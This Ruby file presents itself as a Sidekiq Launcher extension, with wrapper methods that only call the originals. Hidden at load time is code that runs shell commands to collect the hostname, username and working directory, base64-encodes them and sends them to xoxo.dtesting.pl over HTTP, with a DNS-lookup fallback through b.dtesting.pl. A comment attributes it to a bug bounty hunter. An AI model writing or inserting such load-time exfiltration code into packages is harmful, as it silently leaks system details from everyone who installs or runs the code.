require 'sidekiq/launcher'
require 'base64'
require 'resolv'
require 'net/http'

fooo = ->(variable) {
  variable.gsub! "=", "00"
  variable.gsub! "+", "11"
  variable.gsub! "\\", "22"
  variable.gsub! "\n", ""

  return variable
}

# I am a bug bounty huner (https://hackerone.com/kannthu), if you see this it means the code executed.
# My intention is not to break anything.
# I will report this vulnerability to your program.

begin
  host = `hostname`
  username = `echo $USER`
  current_path = `pwd`

  host_encoded = Base64.encode64(host)
  username_encoded = Base64.encode64(username)
  current_path_encoded = Base64.encode64(current_path)

  host_encoded.gsub! "\n", ""
  username_encoded.gsub! "\n", ""
  current_path_encoded.gsub! "\n", ""

  path = '/?a='+current_path_encoded +"&b=" + host_encoded+"&c="+username_encoded

  Net::HTTP.get('xoxo.dtesting.pl', path)
rescue
  Resolv.getaddress(fooo.call(username_encoded)+ '.' + fooo.call(host_encoded) + '.b.dtesting.pl')
end

module Sidekiq
  class Launcher
    # remember old initialize
    alias_method :old_initialize, :initialize

    # add cron poller and execute normal initialize of Sidekiq launcher
    def initialize(options)
      old_initialize options



    end

    # remember old run
    alias_method :old_run, :run

    # execute normal run of launcher and run cron poller
    def run
      old_run
    end

    # remember old quiet
    alias_method :old_quiet, :quiet

    # execute normal quiet of launcher and quiet cron poller
    def quiet
      old_quiet
    end

    # remember old stop
    alias_method :old_stop, :stop

    # execute normal stop of launcher and stop cron poller
    def stop
      old_stop
    end
  end
end
